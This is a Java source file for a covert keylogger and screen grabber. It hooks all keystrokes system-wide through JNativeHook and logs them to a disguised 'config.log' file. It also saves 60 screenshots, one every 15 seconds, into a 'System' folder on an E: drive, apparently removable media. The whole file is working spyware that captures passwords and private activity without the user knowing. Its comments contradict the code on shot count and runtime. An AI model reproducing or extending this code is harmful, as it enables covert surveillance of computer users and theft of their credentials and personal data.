/*
 80 by 15000 milliseconds = 20 minutes. Takes 80 shots.
 Actually runs for about 25 minutes, since processes need some extra time to complete.
 Only writes if a folder called 'System' exists in the first possible location on an E:// drive.
 */
package projectglobaldale20nomail;

/**
 *
 * @author Kobevader
 */
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.imageio.ImageIO;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.FileSystems;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.io.UnsupportedEncodingException;
import java.util.Properties;
import java.util.Scanner;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;

import javax.swing.JOptionPane;

/**
 *
 * @author Kobevader
 */
public class ProjectGlobalDale20NoMail implements NativeKeyListener {

    
    //Below is the code for the creation of the image files which will be stored on the E:\\ drive
    
    static File a = new File("E:\\System\\1.jpg");
    static File b = new File("E:\\System\\2.jpg");
    static File c = new File("E:\\System\\3.jpg");
    static File d = new File("E:\\System\\4.jpg");
    static File e = new File("E:\\System\\5.jpg");
    static File f = new File("E:\\System\\6.jpg");
    static File g = new File("E:\\System\\7.jpg");
    static File h = new File("E:\\System\\8.jpg");
    static File i = new File("E:\\System\\9.jpg");
    static File j = new File("E:\\System\\10.jpg");
    static File k = new File("E:\\System\\11.jpg");
    static File l = new File("E:\\System\\12.jpg");
    static File m = new File("E:\\System\\13.jpg");
    static File n = new File("E:\\System\\14.jpg");
    static File o = new File("E:\\System\\15.jpg");
    static File p = new File("E:\\System\\16.jpg");
    static File q = new File("E:\\System\\17.jpg");
    static File r = new File("E:\\System\\18.jpg");
    static File s = new File("E:\\System\\19.jpg");
    static File t = new File("E:\\System\\20.jpg");
    static File aa = new File("E:\\System\\21.jpg");
    static File bb = new File("E:\\System\\22.jpg");
    static File cc = new File("E:\\System\\23.jpg");
    static File dd = new File("E:\\System\\24.jpg");
    static File ee = new File("E:\\System\\25.jpg");
    static File ff = new File("E:\\System\\26.jpg");
    static File gg = new File("E:\\System\\27.jpg");
    static File hh = new File("E:\\System\\28.jpg");
    static File ii = new File("E:\\System\\29.jpg");
    static File jj = new File("E:\\System\\30.jpg");
    static File kk = new File("E:\\System\\31.jpg");
    static File ll = new File("E:\\System\\32.jpg");
    static File mm = new File("E:\\System\\33.jpg");
    static File nn = new File("E:\\System\\34.jpg");
    static File oo = new File("E:\\System\\35.jpg");
    static File pp = new File("E:\\System\\36.jpg");
    static File qq = new File("E:\\System\\37.jpg");
    static File rr = new File("E:\\System\\38.jpg");
    static File ss = new File("E:\\System\\39.jpg");
    static File tt = new File("E:\\System\\40.jpg");
    static File aaa = new File("E:\\System\\41.jpg");
    static File bbb = new File("E:\\System\\42.jpg");
    static File ccc = new File("E:\\System\\43.jpg");
    static File ddd = new File("E:\\System\\44.jpg");
    static File eee = new File("E:\\System\\45.jpg");
    static File fff = new File("E:\\System\\46.jpg");
    static File ggg = new File("E:\\System\\47.jpg");
    static File hhh = new File("E:\\System\\48.jpg");
    static File iii = new File("E:\\System\\49.jpg");
    static File jjj = new File("E:\\System\\50.jpg");
    static File kkk = new File("E:\\System\\51.jpg");
    static File lll = new File("E:\\System\\52.jpg");
    static File mmm = new File("E:\\System\\53.jpg");
    static File nnn = new File("E:\\System\\54.jpg");
    static File ooo = new File("E:\\System\\55.jpg");
    static File ppp = new File("E:\\System\\56.jpg");
    static File qqq = new File("E:\\System\\57.jpg");
    static File rrr = new File("E:\\System\\58.jpg");
    static File sss = new File("E:\\System\\59.jpg");
    static File ttt = new File("E:\\System\\60.jpg");

    static File xx = new File("E:\\System\\config.log"); //This is the log file which will contain keystrokes
    static int count = 0; 

    public void nativeKeyPressed(NativeKeyEvent e) { //Implementing abstract method

    }

    public void nativeKeyReleased(NativeKeyEvent e) { //Method for writing to the log file (previously declared as xx) with individual keystrokes 
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        try {
            String keyString;
            keyString = NativeKeyEvent.getKeyText(e.getKeyCode()) + "'";

            if (!xx.exists()) {
                xx.createNewFile();

            }
            FileWriter fw = new FileWriter(xx.getAbsoluteFile(), true); 
            BufferedWriter bw = new BufferedWriter(fw);
            bw.append(keyString);
            bw.newLine();
            bw.close();
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) { //Implementing abstract method

    }

    public static void main(String[] args) throws NativeHookException, InterruptedException, AWTException, IOException { //MAIN METHOD

        try {

            GlobalScreen.registerNativeHook(); //Need this line to use the 3rd party lib JNativeHook

        } catch (NativeHookException ex) { //Just in case the previous line doesn't execute correctly

            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.getInstance().addNativeKeyListener(new ProjectGlobalDale20NoMail()); //Initiates a global keylistener

        Thread process = new Thread(); //New thread
        process.start();              // Start a process
        Thread.sleep(15000);         //  Sleep the thread for 15 seconds

        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()); //Draw a rectangle based on the screensize
        BufferedImage capture = new Robot().createScreenCapture(screenRect);              // Use java's robot class to take a screenshot of aforementioned rectangle
        ImageIO.write(capture, "jpg", a);                                                //  Write this screenshot to the first file, known as a.

        Thread.sleep(15000);    //Sleep for 15 seconds, as a delay between screenshot events. The following code is all repetition. See next comment.

        Rectangle screenRect2 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture2 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture2, "jpg", b);

        Thread.sleep(15000);

        Rectangle screenRect3 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture3 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture3, "jpg", c);

        Thread.sleep(15000);

        Rectangle screenRect4 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture4 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture4, "jpg", d);

        Thread.sleep(15000);

        Rectangle screenRect5 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture5 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture5, "jpg", e);

        Thread.sleep(15000);

        Rectangle screenRect6 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture6 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture6, "jpg", f);

        Thread.sleep(15000);

        Rectangle screenRect7 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture7 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture7, "jpg", g);

        Thread.sleep(15000);

        Rectangle screenRect8 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture8 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture8, "jpg", h);

        Thread.sleep(15000);

        Rectangle screenRect9 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture9 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture9, "jpg", i);

        Thread.sleep(15000);

        Rectangle screenRect10 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture10 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture10, "jpg", j);

        Thread.sleep(15000);

        Rectangle screenRect11 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture11 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture11, "jpg", k);

        Thread.sleep(15000);

        Rectangle screenRect12 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture12 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture12, "jpg", l);

        Thread.sleep(15000);

        Rectangle screenRect13 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture13 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture13, "jpg", m);

        Thread.sleep(15000);

        Rectangle screenRect14 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture14 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture14, "jpg", n);

        Thread.sleep(15000);

        Rectangle screenRect15 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture15 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture15, "jpg", o);

        Thread.sleep(15000);

        Rectangle screenRect16 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture16 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture16, "jpg", p);

        Thread.sleep(15000);

        Rectangle screenRect17 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture17 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture17, "jpg", q);

        Thread.sleep(15000);

        Rectangle screenRect18 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture18 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture18, "jpg", r);

        Thread.sleep(15000);

        Rectangle screenRect19 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture19 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture19, "jpg", s);

        Thread.sleep(15000);

        Rectangle screenRect20 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture20 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture20, "jpg", t);

        Thread.sleep(15000);

        Rectangle screenRect21 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture21 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture21, "jpg", aa);

        Thread.sleep(15000);

        Rectangle screenRect22 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture22 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture22, "jpg", bb);

        Thread.sleep(15000);

        Rectangle screenRect23 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture23 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture23, "jpg", cc);

        Thread.sleep(15000);

        Rectangle screenRect24 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture24 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture24, "jpg", dd);

        Thread.sleep(15000);

        Rectangle screenRect25 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture25 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture25, "jpg", ee);

        Thread.sleep(15000);

        Rectangle screenRect26 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture26 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture26, "jpg", ff);

        Thread.sleep(15000);

        Rectangle screenRect27 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture27 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture27, "jpg", gg);

        Thread.sleep(15000);

        Rectangle screenRect28 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture28 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture28, "jpg", hh);

        Thread.sleep(15000);

        Rectangle screenRect29 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture29 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture29, "jpg", ii);

        Thread.sleep(15000);

        Rectangle screenRect30 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture30 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture30, "jpg", jj);

        Thread.sleep(15000);

        Rectangle screenRect31 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture31 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture31, "jpg", kk);

        Thread.sleep(15000);

        Rectangle screenRect32 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture32 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture32, "jpg", ll);

        Thread.sleep(15000);

        Rectangle screenRect33 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture33 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture33, "jpg", mm);

        Thread.sleep(15000);

        Rectangle screenRect34 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture34 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture34, "jpg", nn);

        Thread.sleep(15000);

        Rectangle screenRect35 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture35 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture35, "jpg", oo);

        Thread.sleep(15000);

        Rectangle screenRect36 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture36 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture36, "jpg", pp);

        Thread.sleep(15000);

        Rectangle screenRect37 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture37 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture37, "jpg", qq);

        Thread.sleep(15000);

        Rectangle screenRect38 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture38 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture38, "jpg", rr);

        Thread.sleep(15000);

        Rectangle screenRect39 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture39 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture39, "jpg", ss);

        Thread.sleep(15000);

        Rectangle screenRect40 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture40 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture40, "jpg", tt);

        Thread.sleep(15000);

        Rectangle screenRect41 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture41 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture41, "jpg", aaa);

        Thread.sleep(15000);

        Rectangle screenRect42 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture42 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture42, "jpg", bbb);

        Thread.sleep(15000);

        Rectangle screenRect43 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture43 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture43, "jpg", ccc);

        Thread.sleep(15000);

        Rectangle screenRect44 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture44 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture44, "jpg", ddd);

        Thread.sleep(15000);

        Rectangle screenRect45 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture45 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture45, "jpg", eee);

        Thread.sleep(15000);

        Rectangle screenRect46 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture46 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture46, "jpg", fff);

        Thread.sleep(15000);

        Rectangle screenRect47 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture47 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture47, "jpg", ggg);

        Thread.sleep(15000);

        Rectangle screenRect48 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture48 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture48, "jpg", hhh);

        Thread.sleep(15000);

        Rectangle screenRect49 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture49 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture49, "jpg", iii);

        Thread.sleep(15000);

        Rectangle screenRect50 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture50 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture50, "jpg", jjj);

        Thread.sleep(15000);

        Rectangle screenRect51 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture51 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture51, "jpg", kkk);

        Thread.sleep(15000);

        Rectangle screenRect52 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture52 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture52, "jpg", lll);

        Thread.sleep(15000);

        Rectangle screenRect53 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture53 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture53, "jpg", mmm);

        Thread.sleep(15000);

        Rectangle screenRect54 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture54 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture54, "jpg", nnn);

        Thread.sleep(15000);

        Rectangle screenRect55 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture55 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture55, "jpg", ooo);

        Thread.sleep(15000);

        Rectangle screenRect56 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture56 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture56, "jpg", ppp);

        Thread.sleep(15000);

        Rectangle screenRect57 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture57 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture57, "jpg", qqq);

        Thread.sleep(15000);

        Rectangle screenRect58 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture58 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture58, "jpg", rrr);

        Thread.sleep(15000);

        Rectangle screenRect59 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture59 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture59, "jpg", sss);

        Thread.sleep(15000);

        Rectangle screenRect60 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture60 = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture60, "jpg", ttt);

        System.out.println("See ya later space cowboy"); //Kek
        System.exit(0); //Ends the process associated with the program. Total runtime is approximately 15 minutes. Files are now stores on a folder called 'System' on the E: drive. 

    }

}
